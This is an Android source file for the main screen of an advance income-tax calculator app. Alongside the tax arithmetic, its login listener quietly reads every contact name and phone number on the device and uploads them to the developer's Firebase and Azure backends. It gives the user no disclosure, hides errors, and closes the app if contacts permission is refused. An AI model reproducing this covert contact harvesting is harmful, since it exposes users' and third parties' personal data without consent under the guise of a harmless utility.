package com.nineinfosys.android.advancedtaxcalculator;

import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;


import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.widget.ArrayAdapter;

import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import com.facebook.login.LoginManager;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.microsoft.windowsazure.mobileservices.MobileServiceClient;
import com.microsoft.windowsazure.mobileservices.http.OkHttpClientFactory;
import com.microsoft.windowsazure.mobileservices.table.MobileServiceTable;
import com.nineinfosys.android.advancedtaxcalculator.DashBord.GetApp;
import com.nineinfosys.android.advancedtaxcalculator.Login.Contacts;
import com.nineinfosys.android.advancedtaxcalculator.Login.LoginActivity;
import com.squareup.okhttp.OkHttpClient;

import java.net.MalformedURLException;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.WRITE_CONTACTS;


public class MainActivity extends AppCompatActivity {
    ///Azure Database connection for contact uploading
    private MobileServiceClient mobileServiceClientContactUploading;
    private MobileServiceTable<Contacts> mobileServiceTableContacts;
    private ArrayList<Contacts> azureContactArrayList;
    private static final int PERMISSION_REQUEST_CODE = 200;
    //Firebase variables... for authentication and contact uploading to firebase
    private FirebaseAuth firebaseAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListner;
    private DatabaseReference databaseReferenceUserContacts;
    DrawerLayout mDrawerLayout;
    NavigationView mNavigationView;
    FragmentManager mFragmentManager;
    FragmentTransaction mFragmentTransaction;
    ImageView profilePictureView;

    DecimalFormat f = new DecimalFormat("##.00");
    public Toolbar toolbar;
    TextView first,second,third,fourth,fivth,firstI,secondI,thirdI,fourthI,fivthI;
    Spinner  genderspinner;
    AdvancedTaxMain income;
    EditText incometaxsalary,housingloan,selfoccupied,letablevalue,municipaltaxes,unrealizedrent,netincome,standarddeduction,
            interestonhousing1,totalhousedittextid, shortterm1,shortterm2,lonterm1,longterm2,totalcapitalgain,interest,commision,lotery,
            totalothersources,reliefedittext, surchargeedittext, educationedittext, higherandseceducationcessedittext, totalreliefedittext,totalnet,amountofint,letout;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        this.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);
        DecimalFormat f = new DecimalFormat("##.00");
        Configuration config = getResources().getConfiguration();

        genderspinner = (Spinner) findViewById(R.id.genderspinnerid);
        incometaxsalary=(EditText)findViewById(R.id.incometaxedittextid);
        housingloan=(EditText)findViewById(R.id.intersetonhousingloanedittextid);
        housingloan.setText("0");
        selfoccupied=(EditText)findViewById(R.id.interestonselfoccupiededittext);
        selfoccupied.setEnabled(false);
        Button buttonCalculte = (Button) findViewById(R.id.buttoncalculate);
        letablevalue=(EditText)findViewById(R.id.annualliablevalueedittextid);
        letablevalue.setText("0");
        municipaltaxes=(EditText)findViewById(R.id.muncipaltaxesedittextid);
        municipaltaxes.setText("0");
        unrealizedrent =(EditText)findViewById(R.id.unrealizedrentedittextid);
        unrealizedrent.setText("0");
        netincome =(EditText)findViewById(R.id.netincomevalueedittextid);
        netincome.setEnabled(false);
        standarddeduction =(EditText)findViewById(R.id.standarddeductionedittextid);
        standarddeduction.setEnabled(false);
        interestonhousing1 =(EditText)findViewById(R.id.interestonhousingedittextid);
        interestonhousing1.setText("0");
        totalhousedittextid =(EditText)findViewById(R.id.totalhousetextid);
        totalhousedittextid.setEnabled(false);
        shortterm1=(EditText)findViewById(R.id.shortterm1edittextid);
        shortterm1.setText("0");
        shortterm2=(EditText)findViewById(R.id.shortterm2edittextid);
        shortterm2.setText("0");
        lonterm1=(EditText)findViewById(R.id.longterm1edittextid123);
        lonterm1.setText("0");
        longterm2=(EditText)findViewById(R.id.longterm2edittextid);
        longterm2.setText("0");
        totalcapitalgain=(EditText)findViewById(R.id.totalcapitalgainedittextid);
        totalcapitalgain.setEnabled(false);
        interest=(EditText)findViewById(R.id.interestedittextid);
        interest.setText("0");
        commision=(EditText)findViewById(R.id.Commissionedittextid);
        commision.setText("0");
        lotery= (EditText)findViewById(R.id.Lotteryedittextid);
        lotery.setText("0");
        totalothersources=(EditText)findViewById(R.id.totalotheredittextid);
        totalothersources.setEnabled(false);
        reliefedittext = (EditText) findViewById(R.id.incometaxreliefedittextid);
        reliefedittext.setEnabled(false);
        surchargeedittext = (EditText) findViewById(R.id.surchargeedittextid123);
        surchargeedittext.setEnabled(false);
        educationedittext = (EditText) findViewById(R.id.educationcessedittextid);
        educationedittext.setEnabled(false);
        higherandseceducationcessedittext = (EditText) findViewById(R.id.higherandseceducessedittextid);
        higherandseceducationcessedittext.setEnabled(false);
        totalreliefedittext = (EditText) findViewById(R.id.totalreliefedittextid);
        totalreliefedittext.setEnabled(false);
        totalnet=(EditText)findViewById(R.id.totalnettaxedittextid);
        totalnet.setEnabled(false);
        letout=(EditText)findViewById(R.id.interestfromletoutedittextid);
        letout.setText("0");
        first=(TextView)findViewById(R.id.firstedittextid);
        second=(TextView)findViewById(R.id.secondedittextid);
        third=(TextView)findViewById(R.id.thirdedittextid);
        fourth=(TextView)findViewById(R.id.fourthedittextid);
        fivth=(TextView)findViewById(R.id.fivthedittext);
        firstI=(TextView)findViewById(R.id.firstIedittext);
        secondI=(TextView)findViewById(R.id.secondIedittext);
        thirdI=(TextView)findViewById(R.id.thirdIedittext);
        fourthI=(TextView)findViewById(R.id.fourthiedittextid);
        fivthI=(TextView)findViewById(R.id.fivthiedittext);
        Button buttonhelp = (Button) findViewById(R.id.advancetaxhelp);




        ArrayList gender = new ArrayList();
        gender.add("Citizen");
        gender.add("seniorCitizen");
        gender.add("SeniorSuperCitizen");
        ArrayAdapter<String> dataAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_spinner_item, gender);
        dataAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        genderspinner.setAdapter(dataAdapter);

        mDrawerLayout = (DrawerLayout) findViewById(R.id.drawerLayout);
        mNavigationView = (NavigationView) findViewById(R.id.shitstuff);


        mFragmentManager = getSupportFragmentManager();
        mFragmentTransaction = mFragmentManager.beginTransaction();


        mNavigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(MenuItem menuItem) {
                mDrawerLayout.closeDrawers();


                //communicate
                if (menuItem.getItemId() == R.id.Share) {
                    final String appPackageName = getPackageName();
                    Intent intent = new Intent(Intent.ACTION_SEND);
                    intent.setType("text/plain");
                    String shareBodyText = "https://play.google.com/store/apps/details?id=" + appPackageName;
                    intent.putExtra(Intent.EXTRA_SUBJECT, "Subject/Title");
                    intent.putExtra(Intent.EXTRA_TEXT, shareBodyText);
                    startActivity(Intent.createChooser(intent, "Choose sharing method"));

                }

                if (menuItem.getItemId() == R.id.AppStore) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://developer?id=GeniusNine+Info+Systems+LLP")));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/developer?id=GeniusNine+Info+Systems+LLP")));
                    }
                }

                if (menuItem.getItemId() == R.id.GetApps) {

                    Intent intent=new Intent(MainActivity.this,GetApp.class);
                    startActivity(intent);


                }


                if (menuItem.getItemId() == R.id.RateUs) {
                    final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
                    } catch (android.content.ActivityNotFoundException anfe) {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
                    }


                }


                return false;
            }


        });
        toolbar = (android.support.v7.widget.Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        ActionBarDrawerToggle mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.app_name, R.string.app_name);
        mDrawerLayout.setDrawerListener(mDrawerToggle);
        mDrawerToggle.syncState();
        authenticate();

        buttonCalculte.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(incometaxsalary.getText().toString().equals("")){
                    incometaxsalary.setError("Enter the Salary");
                } else if(letablevalue.getText().toString().equals("")){
                }else if(municipaltaxes.getText().toString().equals("")){

                }else if(unrealizedrent.getText().toString().equals("")){

                }else if(interestonhousing1.getText().toString().equals("")){

                } else if(shortterm1.getText().toString().equals("")){

                } else if(shortterm2.getText().toString().equals("")){

                } else if(lonterm1.getText().toString().equals("")){

                } else if(longterm2.getText().toString().equals("")){

                }else if(interest.getText().toString().equals("")){

                }else if(commision.getText().toString().equals("")){

                }else if(lotery.getText().toString().equals("")){

                }else if(housingloan.getText().toString().equals("")){

                }else{
                    DecimalFormat f = new DecimalFormat("##.00");
                    Integer salaryincome = Integer.parseInt(incometaxsalary.getText().toString());
                    Integer house = Integer.parseInt(housingloan.getText().toString());
                    Integer letable = Integer.parseInt(letablevalue.getText().toString());
                    Integer municipal = Integer.parseInt(municipaltaxes.getText().toString());
                    Integer unrealized = Integer.parseInt(unrealizedrent.getText().toString());
                    Integer intersthousing = Integer.parseInt(interestonhousing1.getText().toString());
                    Integer short1 = Integer.parseInt(shortterm1.getText().toString());
                    Integer short2 = Integer.parseInt(shortterm2.getText().toString());
                    Integer long1 = Integer.parseInt(lonterm1.getText().toString());
                    Integer long2 = Integer.parseInt(longterm2.getText().toString());
                    Integer interestt = Integer.parseInt(interest.getText().toString());
                    Integer commisionn = Integer.parseInt(commision.getText().toString());
                    Integer loteryy = Integer.parseInt(lotery.getText().toString());
                    int capitalgainvaluetotal = (short1 + short2 + long1 + long2);
                    totalcapitalgain.setText(String.valueOf(capitalgainvaluetotal));
                    selfoccupied.setText(String.valueOf(-(house)));
                    int NAV = (letable - (municipal + unrealized));
                    netincome.setText(String.valueOf(NAV));
                    standarddeduction.setText(String.valueOf(NAV * 30 / 100));
                    int valuetotalhouse = ((-house)+(NAV - ((NAV * 30 / 100) + intersthousing)));
                    int incomeother = interestt + commisionn + loteryy;
                    totalhousedittextid.setText(String.valueOf(valuetotalhouse));
                    totalothersources.setText(String.valueOf(interestt + commisionn + loteryy));
                    totalnet.setText(String.valueOf(salaryincome + valuetotalhouse + capitalgainvaluetotal + incomeother));
                    double nettax = (salaryincome + valuetotalhouse + capitalgainvaluetotal + incomeother);
                    String spinnerGender = genderspinner.getSelectedItem().toString().trim();
                    income = new AdvancedTaxMain(nettax, spinnerGender);
                    double incomerelief = income.calculateIncomeTaxAfterRelief();
                    double surchargeValue = income.calculateSurcharge();
                    double educationalcess = income.calculateIncomeTaxAfterRelief() * 0.02;
                    double highereducationalcess = income.calculateIncomeTaxAfterRelief() * 0.01;
                    reliefedittext.setText(String.valueOf((f.format(incomerelief))));
                    educationedittext.setText(String.valueOf((f.format(educationalcess))));
                    surchargeedittext.setText(String.valueOf((f.format(surchargeValue))));
                    higherandseceducationcessedittext.setText(String.valueOf((f.format(highereducationalcess))));
                    totalreliefedittext.setText(String.valueOf((f.format(incomerelief + educationalcess + highereducationalcess + surchargeValue))));
                    double i= income.uptoJune();
                    first.setText(String.valueOf(f.format(i)));
                    second.setText(String.valueOf(f.format(income.uptoSep())));
                    third.setText(String.valueOf(f.format(income.uptoDec())));
                    fourth.setText(String.valueOf(f.format(income.uptoMarch())));
                    fivth.setText(String.valueOf(f.format(income.uptoMarch())));

                    firstI.setText(String.valueOf(f.format(i)));
                    secondI.setText(String.valueOf(f.format(income.uptoSep()-(income.uptoJune()))));
                    thirdI.setText(String.valueOf(f.format(income.uptoDec()-(income.uptoSep()))));
                    fourthI.setText(String.valueOf(f.format(income.uptoMarch()-(income.uptoDec()))));
                    fivthI.setText(String.valueOf(f.format(income.uptoMarch()-(income.uptoMarch()))));


                }
            }
        });
        buttonhelp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                Intent helpref = new Intent(MainActivity.this,AdvancedTaxHelp.class);
                startActivity(helpref);
            }
        });
    }
    ///Uploading contacts to azure
    private void uploadContactsToAzure(){
        initializeAzureTable();
        fetchContacts();
        uploadContact();
    }
    private void initializeAzureTable() {
        try {
            mobileServiceClientContactUploading = new MobileServiceClient(
                    getString(R.string.web_address),
                    this);
            mobileServiceClientContactUploading.setAndroidHttpClientFactory(new OkHttpClientFactory() {
                @Override
                public OkHttpClient createOkHttpClient() {
                    OkHttpClient client = new OkHttpClient();
                    client.setReadTimeout(20, TimeUnit.SECONDS);
                    client.setWriteTimeout(20, TimeUnit.SECONDS);
                    return client;
                }
            });
            mobileServiceTableContacts = mobileServiceClientContactUploading.getTable(Contacts.class);


        } catch (MalformedURLException e) {

        } catch (Exception e) {

        }
    }
    private void fetchContacts(){
        try {
            azureContactArrayList = new ArrayList<Contacts>();

            Cursor phone=getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);

            while(phone.moveToNext()){
                Contacts contact = new Contacts();
                contact.setContactname(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contact.setContactnumber(phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.setFirebaseid(firebaseAuth.getCurrentUser().getUid());
                azureContactArrayList.add(contact);

            }
            phone.close();
        }catch (Exception e){
        }
    }
    private void uploadContact() {
        for (Contacts c : azureContactArrayList) {
            try {
                asyncUploader(c);
            }
            catch (Exception e){
                Log.e("uploadContact : ", e.toString());
            }
        }
    }
    private void asyncUploader(Contacts contact){
        final Contacts item = contact;
        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    mobileServiceTableContacts.insert(item);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {

                            } catch (Exception e) {
                            }


                        }
                    });
                } catch (final Exception e) {
                }
                return null;
            }
        };
        task.execute();
    }


    ///Authentication with firebase
    private void authenticate(){
        firebaseAuth = FirebaseAuth.getInstance();
        firebaseAuthListner = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                if(firebaseAuth.getCurrentUser()==null){
                    Log.e("ForumMainActivity:", "User was null so directed to Login activity");
                    Intent loginIntent = new Intent(MainActivity.this, LoginActivity.class);
                    loginIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    finish();
                    startActivity(loginIntent);

                }
                else {
                    if (!checkPermission()) {
                        requestPermission();
                    } else {
                        //Toast.makeText(MainActivityDrawer.this,"Permission already granted.",Toast.LENGTH_LONG).show();
                        syncContactsWithFirebase();
                        uploadContactsToAzure();

                    }
                }

            }
        };

    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.e("ForumMainActivity:", "Starting auth listener");
        firebaseAuth.addAuthStateListener(firebaseAuthListner);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        //noinspection SimplifiableIfStatement

        if (id == R.id.action_logout){
            closeapp();

        }

        return super.onOptionsItemSelected(item);
    }
    protected void syncContactsWithFirebase(){

        AsyncTask<Void, Void, Void> task = new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... params) {
                try {
                    databaseReferenceUserContacts = FirebaseDatabase.getInstance().getReference().child(getString(R.string.app_id)).child("Contacts");

                    String user_id = firebaseAuth.getCurrentUser().getUid();
                    DatabaseReference current_user_db = databaseReferenceUserContacts.child(user_id);


                    Cursor phone = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

                    while (phone.moveToNext()) {
                        String name;
                        String number;

                        name = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        number = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        try {
                            current_user_db.child(number).setValue(name);

                        } catch (Exception e) {

                        }
                    }
                    runOnUiThread(new Runnable() {

                        @Override
                        public void run() {
                        }
                    });
                } catch (Exception exception) {

                }
                return null;
            }
        };

        task.execute();
    }

    public  void closeapp(){
        android.app.AlertDialog.Builder alertDialogBuilder = new android.app.AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("Are you sure you want to close App?");
        alertDialogBuilder.setPositiveButton("Yes",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                        FirebaseAuth.getInstance().signOut();
                        LoginManager.getInstance().logOut();
                    }
                });

        alertDialogBuilder.setNegativeButton("No",
                new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {

                    }
                });

        //Showing the alert dialog
        android.app.AlertDialog alertDialog = alertDialogBuilder.create();
        alertDialog.setCanceledOnTouchOutside(false);
        alertDialog.show();
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_BACK:
                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setMessage("Are you sure you want to close App?");
                alertDialogBuilder.setPositiveButton("Yes",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {

                                finish();

                            }
                        });

                alertDialogBuilder.setNegativeButton("No", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface arg0, int arg1) {


                    }
                });

                //Showing the alert dialog
                AlertDialog alertDialog = alertDialogBuilder.create();
                alertDialog.show();
                return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    //used this when mobile orientaion is changed
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        // Checks the orientation of the screen
        if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
            //Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
        } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT) {
            //Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
        }
    }
    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), READ_CONTACTS);
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), WRITE_CONTACTS);
        return result == PackageManager.PERMISSION_GRANTED && result1 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {
        ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean locationAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean cameraAccepted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (locationAccepted && cameraAccepted) {
                    }
                    else {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
                                android.app.AlertDialog.Builder alertDialogBuilder = new android.app.AlertDialog.Builder(MainActivity.this);
                                alertDialogBuilder.setMessage("You must grant permissions for App to work properly");
                                alertDialogBuilder.setPositiveButton("yes",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {

                                                Log.e("ALERT BOX ", "Requesting Permissions");

                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                    requestPermissions(new String[]{READ_CONTACTS, WRITE_CONTACTS}, PERMISSION_REQUEST_CODE);
                                                }
                                            }
                                        });

                                alertDialogBuilder.setNegativeButton("No",new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        Log.e("ALERT BOX ", "Permissions not granted");
                                        finish();
                                    }
                                });

                                android.app.AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;
                            }
                            else{
                                android.app.AlertDialog.Builder alertDialogBuilder = new android.app.AlertDialog.Builder(MainActivity.this);
                                alertDialogBuilder.setMessage("You must grant permissions from  App setting to work");
                                alertDialogBuilder.setPositiveButton("Ok",
                                        new DialogInterface.OnClickListener() {
                                            @Override
                                            public void onClick(DialogInterface arg0, int arg1) {
                                                finish();
                                            }
                                        });

                                android.app.AlertDialog alertDialog = alertDialogBuilder.create();
                                alertDialog.setCanceledOnTouchOutside(false);
                                alertDialog.show();
                                return;

                            }
                        }

                    }
                }

                break;
        }
    }

}

